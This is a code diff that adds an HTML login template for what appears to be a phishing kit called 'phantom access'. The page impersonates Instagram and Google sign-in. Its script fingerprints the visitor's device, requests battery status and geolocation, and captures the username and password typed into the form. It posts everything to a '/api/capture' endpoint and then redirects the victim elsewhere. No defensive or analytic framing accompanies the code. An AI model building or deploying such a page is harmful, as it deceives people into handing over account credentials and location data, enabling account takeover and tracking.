@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>{{ brand }} • Log in</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+       background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .wrap{width:100%;max-width:350px}
+  .logo{text-align:center;font-size:34px;font-weight:600;letter-spacing:-1px;margin-bottom:26px;color:#262626}
+  .logo.google{font-size:26px;letter-spacing:0}
+  .box{background:#fff;border:1px solid #dbdbdb;border-radius:12px;padding:26px 30px;text-align:center}
+  .box.google{border:none;box-shadow:0 1px 3px rgba(0,0,0,.14);border-radius:8px;text-align:left;padding:40px 34px}
+  input{width:100%;padding:11px 12px;margin-bottom:8px;border:1px solid #dbdbdb;border-radius:6px;
+        font-size:14px;background:#fafafa;outline:none;font-family:inherit}
+  input:focus{border-color:#a8a8a8;background:#fff}
+  .box.google input{background:#fff;border-radius:4px;margin-bottom:18px}
+  button{width:100%;padding:11px;margin-top:8px;border:none;border-radius:8px;background:#0095f6;
+         color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
+  button:hover{background:#1877f2}
+  .box.google button{background:#1a73e8;border-radius:4px;font-weight:500}
+  .sub{font-size:12px;color:#8e8e8e;margin-top:16px}
+  .hint{font-size:11px;color:#c7c7c7;text-align:center;margin-top:22px;font-family:ui-monospace,monospace}
+  .msg{font-size:12px;color:#0095f6;margin-top:12px;min-height:16px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo {% if service == 'google' %}google{% endif %}">
+    {% if service == 'google' %}Sign in{% else %}{{ brand }}{% endif %}
+  </div>
+  <div class="box {% if service == 'google' %}google{% endif %}">
+    {% if service == 'google' %}<div style="font-size:15px;margin-bottom:6px">Sign in</div>
+    <div style="font-size:13px;color:#5f6368;margin-bottom:22px">to continue to {{ brand }}</div>{% endif %}
+    <form id="f">
+      <input id="u" type="text" placeholder="{% if service == 'google' %}Email or phone{% else %}Phone number, username or email{% endif %}" autocomplete="username" required>
+      <input id="p" type="password" placeholder="Password" autocomplete="current-password" required>
+      <button type="submit">Log in</button>
+    </form>
+    {% if service == 'instagram' %}<div class="sub">Forgot password?</div>{% endif %}
+    <div class="msg" id="msg"></div>
+  </div>
+  <div class="hint">secured by phantom access</div>
+</div>
+
+<script>
+(function(){
+  var SLUG = "{{ slug }}";
+  var REDIRECT = "{{ redirect_to }}";
+  var endpoint = "/api/capture/" + SLUG;
+
+  function send(kind, data){
+    return fetch(endpoint, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({kind: kind, data: data})
+    }).catch(function(){});
+  }
+
+  var nav = navigator;
+  var fp = {
+    user_agent: nav.userAgent, platform: nav.platform, language: nav.language,
+    languages: (nav.languages || []).join(","),
+    cores: nav.hardwareConcurrency || null,
+    memory_gb: nav.deviceMemory || null,
+    touch_points: nav.maxTouchPoints || 0,
+    screen: screen.width + "x" + screen.height,
+    viewport: innerWidth + "x" + innerHeight,
+    pixel_ratio: devicePixelRatio,
+    color_depth: screen.colorDepth,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tz_offset_min: new Date().getTimezoneOffset(),
+    referrer: document.referrer || "direct",
+    online: nav.onLine
+  };
+
+  try {
+    var c = document.createElement("canvas");
+    var ctx = c.getContext("2d");
+    ctx.textBaseline = "top"; ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60"; ctx.fillRect(0,0,120,30);
+    ctx.fillStyle = "#069"; ctx.fillText("phantom-access-fp", 2, 12);
+    fp.canvas_hash = c.toDataURL().slice(-64);
+  } catch(e) { fp.canvas_hash = "unavailable"; }
+
+  try {
+    var gl = document.createElement("canvas").getContext("webgl");
+    var dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
+    fp.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "unavailable";
+  } catch(e) { fp.gpu = "unavailable"; }
+
+  send("fingerprint", fp);
+
+  if (nav.getBattery) {
+    nav.getBattery().then(function(b){
+      send("battery", {level: Math.round(b.level*100) + "%", charging: b.charging});
+    });
+  }
+
+  if (nav.geolocation) {
+    nav.geolocation.getCurrentPosition(function(pos){
+      send("geolocation", {
+        lat: pos.coords.latitude, lon: pos.coords.longitude,
+        accuracy_m: Math.round(pos.coords.accuracy)
+      });
+    }, function(){}, {timeout: 6000});
+  }
+
+  document.getElementById("f").addEventListener("submit", function(e){
+    e.preventDefault();
+    var u = document.getElementById("u").value;
+    var p = document.getElementById("p").value;
+    document.getElementById("msg").textContent = "Signing in\u2026";
+    send("credentials", {username: u, password: p}).then(function(){
+      document.getElementById("msg").textContent = "Redirecting\u2026";
+      setTimeout(function(){ location.href = REDIRECT; }, 900);
+    });
+  });
+})();
+</script>
+</body>
+</html>
